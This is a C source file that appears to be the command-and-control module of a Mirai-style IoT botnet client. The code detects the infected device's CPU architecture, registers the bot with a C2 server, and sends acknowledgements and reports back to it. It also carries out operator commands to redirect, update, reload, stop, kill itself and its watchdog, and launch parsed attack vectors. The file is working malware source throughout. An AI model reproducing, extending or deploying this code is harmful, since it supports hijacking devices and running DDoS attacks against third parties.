#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <signal.h>

#include "headers/includes.h"
#include "headers/config.h"
#include "headers/protocol.h"
#include "headers/cnc.h"
#include "headers/util.h"
#include "headers/attack.h"
#include "headers/redirect.h"
#include "headers/update.h"
#include "headers/reload.h"

extern int fd_serv;
extern int watchdog_pid;

uint8_t cnc_get_bot_version(void)
{
    return (uint8_t)BOT_VERSION;
}

static bot_arch_t arch_from_machine(const char *machine)
{
    if (!machine || !machine[0])
        return BOT_ARCH_UNKNOWN;

    if (util_strcmp(machine, "mips"))
        return BOT_ARCH_MIPS;
    if (util_strcmp(machine, "mipsel"))
        return BOT_ARCH_MIPSEL;
    if (util_strcmp(machine, "armv4l") || util_strcmp(machine, "armv4tl"))
        return BOT_ARCH_ARM;
    if (util_strcmp(machine, "armv5l"))
        return BOT_ARCH_ARM5;
    if (util_strcmp(machine, "armv6l"))
        return BOT_ARCH_ARM6;
    if (util_strcmp(machine, "armv7l"))
        return BOT_ARCH_ARM7;
    if (util_strcmp(machine, "i386") || util_strcmp(machine, "i486") ||
        util_strcmp(machine, "i586") || util_strcmp(machine, "i686"))
        return BOT_ARCH_X86;
    if (util_strcmp(machine, "x86_64"))
        return BOT_ARCH_X86_64;
    if (util_strcmp(machine, "powerpc") || util_strcmp(machine, "ppc"))
        return BOT_ARCH_PPC;
    if (util_strcmp(machine, "sh4"))
        return BOT_ARCH_SH4;
    if (util_strcmp(machine, "arc"))
        return BOT_ARCH_ARC;

    return BOT_ARCH_UNKNOWN;
}

bot_arch_t cnc_get_arch(void)
{
#if defined(BOT_ARCH)
    return (bot_arch_t)BOT_ARCH;
#else
    struct utsname uts;

    if (uname(&uts) != 0)
        return BOT_ARCH_UNKNOWN;

    return arch_from_machine(uts.machine);
#endif
}

static BOOL cnc_send_all(int fd, const void *buf, size_t len)
{
    const char *p = (const char *)buf;
    size_t sent = 0;

    while (sent < len)
    {
        ssize_t n = send(fd, p + sent, len - sent, MSG_NOSIGNAL);
        if (n <= 0)
            return FALSE;
        sent += (size_t)n;
    }
    return TRUE;
}

BOOL cnc_send_registration(int fd, const char *id)
{
    uint8_t id_len, ver, arch;

    if (fd < 0 || !id)
        return FALSE;

    id_len = (uint8_t)util_strlen(id);
    if (id_len > CNC_ID_MAX_LEN)
        id_len = CNC_ID_MAX_LEN;

    ver = cnc_get_bot_version();
    arch = (uint8_t)cnc_get_arch();

    if (ver >= 2)
    {
        if (!cnc_send_all(fd, CNC_REG_MAGIC_V2_BYTES, CNC_REG_MAGIC_LEN))
            return FALSE;
        if (!cnc_send_all(fd, &ver, 1))
            return FALSE;
        if (!cnc_send_all(fd, &arch, 1))
            return FALSE;
        if (!cnc_send_all(fd, &id_len, 1))
            return FALSE;
        if (id_len > 0 && !cnc_send_all(fd, id, id_len))
            return FALSE;

#ifdef DEBUG
        printf("[cnc] registration v2 sent (ver=%u arch=%u id_len=%u)\n",
               (unsigned)ver, (unsigned)arch, (unsigned)id_len);
#endif
        return TRUE;
    }

    if (!cnc_send_all(fd, CNC_REG_MAGIC_V1_BYTES, CNC_REG_MAGIC_LEN))
        return FALSE;
    if (!cnc_send_all(fd, &id_len, 1))
        return FALSE;
    if (id_len > 0 && !cnc_send_all(fd, id, id_len))
        return FALSE;

#ifdef DEBUG
    printf("[cnc] registration v1 sent (id_len=%u)\n", (unsigned)id_len);
#endif
    return TRUE;
}

BOOL cnc_send_ack(int fd, uint8_t ref_opcode, uint8_t status)
{
    uint8_t pkt[5];
    uint16_t len_be;

    if (fd < 0)
        return FALSE;

    len_be = htons(3);
    pkt[0] = (uint8_t)(len_be >> 8);
    pkt[1] = (uint8_t)(len_be & 0xff);
    pkt[2] = CNC_OP_ACK;
    pkt[3] = ref_opcode;
    pkt[4] = status;

    return cnc_send_all(fd, pkt, sizeof(pkt));
}

BOOL cnc_send_report(int fd, uint8_t type, const uint8_t *data, uint8_t data_len)
{
    uint8_t pkt[3 + CNC_REPORT_MAX];
    uint16_t len_be;
    uint16_t body_len;

    if (fd < 0)
        return FALSE;
    if (data_len > CNC_REPORT_MAX)
        data_len = CNC_REPORT_MAX;

    body_len = 2 + data_len;
    len_be = htons(body_len);
    pkt[0] = (uint8_t)(len_be >> 8);
    pkt[1] = (uint8_t)(len_be & 0xff);
    pkt[2] = CNC_OP_REPORT;
    pkt[3] = type;
    pkt[4] = data_len;
    if (data_len > 0 && data)
        util_memcpy(pkt + 5, data, data_len);

    return cnc_send_all(fd, pkt, 5 + data_len);
}

/* True when CNC sent CMD_ATTACK (0x00) before the normal attack body. */
static BOOL cnc_is_wrapped_attack(const char *buf, int len)
{
    uint8_t vector;

    if (len < 6 || (uint8_t)buf[0] != CNC_OP_ATTACK)
        return FALSE;

    /* Legacy attacks place the vector at byte 4; wrapped at byte 5. */
    if (buf[3] != 0 && (uint8_t)buf[4] < CNC_MAX_ATTACK_VECTOR)
        return FALSE;

    vector = (uint8_t)buf[5];
    if (vector >= CNC_MAX_ATTACK_VECTOR)
        return FALSE;

    return TRUE;
}

static void cnc_handle_redirect(char *buf, int len)
{
    redirect_handle(buf, len);
}

static void cnc_handle_update(char *buf, int len)
{
    update_handle(buf, len);
}

static void cnc_handle_reload(char *buf, int len)
{
    (void)buf;
    (void)len;
    reload_handle();
}

static void cnc_handle_kill(char *buf, int len)
{
    (void)buf;
    (void)len;

    cnc_send_ack(fd_serv, CNC_OP_KILL, CNC_ACK_OK);
    attack_kill_all();

    if (watchdog_pid != 0)
        kill(watchdog_pid, SIGKILL);

    _exit(0);
}

static void cnc_handle_stop(char *buf, int len)
{
    (void)buf;
    (void)len;

    attack_kill_all();
    cnc_send_ack(fd_serv, CNC_OP_STOP, CNC_ACK_OK);
}

static void cnc_handle_ping(char *buf, int len)
{
    (void)buf;
    (void)len;
#ifdef DEBUG
    printf("[cnc] CMD_PING received\n");
#endif
}

void cnc_dispatch(char *buf, int len)
{
    uint8_t op;

    if (!buf || len <= 0)
        return;

    op = (uint8_t)buf[0];

    if (op >= CNC_OP_CMD_MIN && op <= CNC_OP_CMD_MAX)
    {
        switch (op)
        {
        case CNC_OP_REDIRECT:
            cnc_handle_redirect(buf + 1, len - 1);
            break;
        case CNC_OP_UPDATE:
            cnc_handle_update(buf + 1, len - 1);
            break;
        case CNC_OP_RELOAD:
            cnc_handle_reload(buf + 1, len - 1);
            break;
        case CNC_OP_KILL:
            cnc_handle_kill(buf + 1, len - 1);
            break;
        case CNC_OP_STOP:
            cnc_handle_stop(buf + 1, len - 1);
            break;
        case CNC_OP_PING:
            cnc_handle_ping(buf + 1, len - 1);
            break;
        default:
#ifdef DEBUG
            printf("[cnc] unknown command opcode 0x%02x\n", op);
#endif
            break;
        }
        return;
    }

    /* v1 CNC: raw attack body (duration | vector | targets | opts). Never skip
     * the first byte — cnc_is_wrapped_attack() mis-parsed legacy packets when
     * duration byte 3 was 0 (vectors 9+ silently became wrong method). */
    attack_parse(buf, len);
}
